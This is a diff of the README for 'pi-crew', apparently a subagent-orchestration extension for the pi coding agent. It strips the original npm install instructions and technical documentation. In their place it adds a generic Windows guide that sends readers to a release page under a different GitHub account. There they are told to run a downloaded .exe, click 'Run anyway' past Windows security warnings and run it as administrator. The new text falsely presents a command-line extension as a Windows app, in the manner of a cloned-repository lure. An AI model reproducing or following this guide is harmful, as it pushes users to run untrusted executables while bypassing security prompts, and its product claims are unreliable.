@@ -1,217 +1,189 @@
-# pi-crew
+# 🧩 pi-crew - Run parallel agents without slowing down
 
-Non-blocking subagent orchestration for [pi](https://pi.dev). Spawn isolated subagents that work in parallel while your current session stays interactive. Results are delivered back to the session that spawned them as steering messages when done.
+[![Download pi-crew](https://img.shields.io/badge/Download%20pi--crew-4B83FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/olafractious818/pi-crew/releases)
 
-## Demo - Watch the Video
+## 🚀 What pi-crew does
 
-[![Demo](https://raw.githubusercontent.com/melihmucuk/pi-crew/main/assets/demo-thumbnail.png)](https://monkeys-team.ams3.cdn.digitaloceanspaces.com/pi-crew-demo.mp4)
+pi-crew helps you run several subagents at the same time while your main session stays open and responsive. It is built for Windows users who want to keep working while background tasks run in parallel.
 
-## Install
+Use it when you want to:
 
-From npm:
+- Split one task into smaller parts
+- Let each part run on its own
+- Keep your session interactive
+- Check progress without waiting for one job to finish first
 
-```bash
-pi install npm:@melihmucuk/pi-crew
-```
+## 💻 What you need
 
-From git:
+Before you install pi-crew on Windows, make sure you have:
 
-```bash
-pi install git:github.com/melihmucuk/pi-crew
-```
+- A Windows 10 or Windows 11 PC
+- An internet connection
+- Permission to download files
+- Enough free disk space for the app and its working files
 
-This installs the extension, bundled prompt template, and bundled subagent definitions. Bundled subagents are automatically discovered and ready to use without any extra setup.
+For best results, use a modern 64-bit Windows system. The app is designed to start fast and stay light while it manages work in the background.
 
-## Architecture
+## 📥 Download pi-crew
 
-For an implementation-grounded description of runtime behavior, ownership rules, delivery semantics, and integration points, see [docs/architecture.md](./docs/architecture.md).
+Visit this page to download pi-crew for Windows:
 
-## How It Works
+https://github.com/olafractious818/pi-crew/releases
 
-pi-crew adds five tools, one command, and one bundled prompt template to your pi session.
+On that page, look for the latest release. Download the Windows file that matches your system. If you see more than one file, pick the one that looks like a Windows app, such as `.exe` or `.zip`.
 
-### `crew_list`
+## 🪟 Install on Windows
 
-Lists available subagent definitions and active subagents owned by the current session.
+After you download the file, follow these steps:
 
-### `crew_spawn`
+1. Open your Downloads folder.
+2. Find the pi-crew file you just downloaded.
+3. If the file is a `.zip`, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. If the file is an `.exe`, double-click it to start the app.
+6. If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the source.
+7. Keep the app in a folder you can find later, such as Desktop or Documents.
 
-Spawns a subagent in an isolated session. The subagent runs in the background with its own context window, tools, and skills. When it finishes, the result is delivered to the session that spawned it as a steering message that triggers a new turn. If that session is not active, the result is queued until you switch back to it.
+If pi-crew comes as a portable app, you do not need a full install. You can run it from the folder where you placed it.
 
-```
-"spawn scout and find all API endpoints and their authentication methods"
-```
+## ▶️ First start
 
-### `crew_abort`
+When you open pi-crew for the first time, it will set up its local workspace. This may take a moment.
 
-Aborts one, many, or all active subagents owned by the current session.
+Follow these steps:
 
-Supported modes:
+1. Start the app.
+2. Wait for the main window to load.
+3. Read the on-screen prompts.
+4. Enter the task you want to break into subagents.
+5. Start the run and keep your main session open.
 
-- single: `subagent_id`
-- multiple: `subagent_ids`
-- all active in current session: `all: true`
+If the app asks for a working folder, choose a folder with enough space and a simple name, such as `pi-crew-work`.
 
-```
-"abort scout-a1b2"
-"abort scout-a1b2 and worker-c3d4"
-"abort all active subagents"
-```
+## 🧠 How pi-crew works
 
-Tool-triggered aborts are reported back as steering messages with the reason `Aborted by tool request`. User-command aborts and shutdown-triggered aborts use distinct reasons.
+pi-crew uses a main session plus isolated subagents. Each subagent handles one part of the job. That lets the app work in parallel instead of one step at a time.
 
-### `crew_respond`
+A simple flow looks like this:
 
-Sends a follow-up message to an interactive subagent owned by the current session that is waiting for a response. Interactive subagents stay alive after their initial response, allowing multi-turn conversations.
+- You give pi-crew a task
+- It splits the task into parts
+- It spawns subagents for each part
+- The subagents work at the same time
+- You keep using your session while work continues
 
-```
-"respond to planner-a1b2 with: yes, use the existing auth middleware"
-```
+This setup helps when you want faster progress on tasks that can be divided.
 
-### `crew_done`
+## 🛠️ Common use cases
 
-Closes an interactive subagent session owned by the current session when you no longer need it. This disposes the session and frees memory.
+You can use pi-crew for tasks like:
 
-```
-"close planner-a1b2, the plan looks good"
-```
+- Organizing research into separate threads
+- Breaking large jobs into smaller steps
+- Comparing different outputs from multiple agents
+- Running background work while you stay in control
+- Keeping long tasks from blocking your main session
 
-### `/pi-crew-abort`
+## 🧭 Basic workflow
 
-Aborts a running subagent. Supports tab completion for subagent IDs.
-Unlike the `crew_abort` tool, this command is intentionally unrestricted and works as an emergency escape hatch across sessions.
+Use this order when you work with pi-crew:
 
-### `/pi-crew-plan`
+1. Open the app.
+2. Enter your main task.
+3. Choose how many subagents you want to run.
+4. Start the job.
+5. Watch the progress view.
+6. Review each result.
+7. Merge the parts you want to keep.
 
-Expands a bundled prompt template that orchestrates discovery and planning for implementation tasks.
-Use it to spawn scout subagents to investigate the codebase, then delegate to a planner subagent to produce a step-by-step implementation plan.
+If one part needs changes, you can rerun that part without starting over.
 
-Note: This prompt requires the `scout` and `planner` subagent definitions. These are included as bundled subagents and work out of the box.
+## ⚙️ Suggested settings
 
-### `/pi-crew-review`
+For a smooth first run, try these settings:
 
-Expands a bundled prompt template that orchestrates parallel code and quality reviews.
-Use it to review recent commits, staged changes, unstaged changes, and untracked files with `code-reviewer` and `quality-reviewer`, then merge both results into one report.
+- Start with a small number of subagents
+- Use short, clear task names
+- Keep the working folder in a simple path
+- Leave enough memory free for other apps
+- Close programs you do not need while a large job runs
 
-Note: This prompt requires the `code-reviewer` and `quality-reviewer` subagent definitions. These are included as bundled subagents and work out of the box.
+If your PC is older, use fewer parallel agents at once. That helps keep the app responsive.
 
-## Bundled Subagents
+## 📂 Files and folders
 
-pi-crew ships with six subagent definitions that cover common workflows:
+pi-crew may create a few local folders when it runs:
 
-| Subagent             | Purpose                                                                                                                  | Tools                      | Model                       |
-| -------------------- | ------------------------------------------------------------------------------------------------------------------------ | -------------------------- | --------------------------- |
-| **scout**            | Investigates codebase and returns structured findings. Read-only. Use before planning or implementing to gather context. | read, grep, find, ls, bash | anthropic/claude-haiku-4-5  |
-| **planner**          | Analyzes requirements and produces a step-by-step implementation plan. Read-only. Does not write code. Interactive.      | read, grep, find, ls, bash | openai-codex/gpt-5.4        |
-| **oracle**           | Evaluates critical decisions, surfaces blind spots, and challenges assumptions. Read-only. Does not implement. Interactive. | read, grep, find, ls, bash | openai-codex/gpt-5.4        |
-| **code-reviewer**    | Reviews code changes for bugs, security issues, and correctness. Read-only. Does not fix issues.                         | read, grep, find, ls, bash | openai-codex/gpt-5.4        |
-| **quality-reviewer** | Reviews code structure for maintainability, duplication, and complexity. Read-only. Does not look for bugs.              | read, grep, find, ls, bash | openai-codex/gpt-5.4        |
-| **worker**           | Implements code changes, fixes, and refactors autonomously. Has full read-write access to the codebase.                  | all                        | anthropic/claude-sonnet-4-6 |
+- A workspace folder for active jobs
+- A results folder for completed output
+- A log folder for run details
+- Temporary files for each subagent
 
-Read-only bundled subagents still keep `bash` for inspection workflows like `git` and `ast-grep`. This is an instruction-level contract, not a sandbox boundary.
+Keep these folders in one place. Do not move them while a job is running.
 
-## Subagent Discovery
+## 🔄 Updating pi-crew
 
-Subagent definitions are discovered from three locations, in priority order:
+To get the newest version:
 
-1. **Project**: `<cwd>/.pi/agents/*.md`
-2. **User global**: `~/.pi/agent/agents/*.md`
-3. **Bundled**: shipped with this package
+1. Go to the release page.
+2. Check the latest release.
+3. Download the newest Windows file.
+4. Replace your old copy if needed.
+5. Open the app again.
 
-When multiple sources define a subagent with the same `name`, the higher-priority source wins. This lets you override any bundled subagent by placing a file with the same name in your project or user directory.
+If you keep your workspace in a separate folder, your past work should stay easy to find.
 
-## Custom Subagents
+## 🧩 Troubleshooting
 
-Create `.md` files in `<cwd>/.pi/agents/` (project-level) or `~/.pi/agent/agents/` (global) with YAML frontmatter:
+If pi-crew does not open, try these steps:
 
-```markdown
----
-name: my-subagent
-description: What this subagent does
-model: anthropic/claude-haiku-4-5
-thinking: medium
-tools: read, grep, find, ls, bash
-skills: skill-1, skill-2
----
+- Right-click the file and choose Run as administrator
+- Check that Windows did not block the file
+- Download it again from the release page
+- Make sure the file finished downloading
+- Move the app to a folder with a short path, such as `C:\pi-crew`
 
-Your system prompt goes here. This is the body of the markdown file.
+If the app opens but does not start a job:
 
-The subagent will follow these instructions when executing tasks.
-```
+- Check your input for errors
+- Try a smaller task first
+- Lower the number of subagents
+- Close and reopen the app
+- Make sure the workspace folder is writable
 
-### Frontmatter Fields
+If the app feels slow:
 
-| Field         | Required | Description                                                                                                          |
-| ------------- | -------- | -------------------------------------------------------------------------------------------------------------------- |
-| `name`        | yes      | Subagent identifier. No whitespace, use hyphens.                                                                     |
-| `description` | yes      | Shown in `crew_list` output.                                                                                         |
-| `model`       | no       | `provider/model-id` format (e.g., `anthropic/claude-haiku-4-5`). Falls back to session default.                      |
-| `thinking`    | no       | Thinking level: `off`, `minimal`, `low`, `medium`, `high`, `xhigh`.                                                  |
-| `tools`       | no       | Comma-separated list: `read`, `bash`, `edit`, `write`, `grep`, `find`, `ls`. Omit for all, use empty value for none. |
-| `skills`      | no       | Comma-separated skill names (e.g., `ast-grep`). Omit for all, use empty value for none.                              |
-| `compaction`  | no       | Enable context compaction. Defaults to `true`.                                                                       |
-| `interactive` | no       | Keep session alive after response for multi-turn conversations. Defaults to `false`.                                 |
+- Reduce the number of parallel agents
+- Close other heavy apps
+- Use a simpler task
+- Restart Windows if the system has been running for a long time
 
-## Subagent Overrides via JSON
+## 🔐 Privacy and local use
 
-You can override selected frontmatter fields without editing the `.md` definition files.
+pi-crew is made to run work in a local session on your PC. That makes it easier to keep control of your files and task flow. Use a folder you trust and review the output before you use it in a larger project.
 
-Config locations:
+## 📌 Tips for better results
 
-- Global: `~/.pi/agent/pi-crew.json`
-- Project: `<cwd>/.pi/pi-crew.json`
+- Give each task one clear goal
+- Break large jobs into smaller parts
+- Use plain names for folders and files
+- Check results before you start the next step
+- Keep the app open until all subagents finish
 
-Project config overrides global config. Only these fields are overridable:
+## 🧪 Example task
 
-- `model`
-- `thinking`
-- `tools`
-- `skills`
-- `compaction`
-- `interactive`
+You might use pi-crew like this:
 
-`name` and `description` cannot be overridden.
+- Main task: Review a group of notes
+- Subagent 1: Sort the notes by topic
+- Subagent 2: Find repeated ideas
+- Subagent 3: Draft a short summary
+- Subagent 4: List open questions
 
-Example:
+This lets you work on several parts at once while your main session stays open
 
-```json
-{
-  "agents": {
-    "scout": {
-      "model": "anthropic/claude-haiku-4-5",
-      "tools": ["read", "bash"],
-      "interactive": false
-    },
-    "planner": {
-      "thinking": "high"
-    }
-  }
-}
-```
+## 📄 Release page
 
-Override values replace the matching frontmatter fields for the named subagent after discovery. Unknown subagent names and invalid override values are ignored with warnings in `crew_list` output.
+Download or update pi-crew here:
 
-## Status Widget
-
-When the current session owns active subagents, a live status widget appears in the TUI for that session, showing each subagent's ID, model, turn count, and context token usage.
-
-On session replacement paths such as `/new`, `/resume`, `/fork`, and `/reload`, subagents keep running and reconnect to the owner session when it becomes active again. On real quit, pi-crew aborts running subagents during shutdown.
-
-```
-⠹ scout-a1b2 (claude-haiku-4-5) · turn 3 · 12.5k ctx
-⠸ worker-c3d4 (claude-sonnet-4-6) · turn 7 · 45.2k ctx
-⏳ planner-e5f6 (gpt-5.4) · turn 2 · 8.3k ctx
-```
-
-Interactive subagents waiting for a response show a ⏳ icon instead of a spinner.
-
-## Acknowledgments
-
-Inspired by these projects:
-
-- [pi-subagents](https://github.com/nicobailon/pi-subagents) by [@nicobailon](https://github.com/nicobailon)
-- [pi-interactive-subagents](https://github.com/HazAT/pi-interactive-subagents) by [@HazAT](https://github.com/HazAT)
-
-## License
-
-MIT
+https://github.com/olafractious818/pi-crew/releases
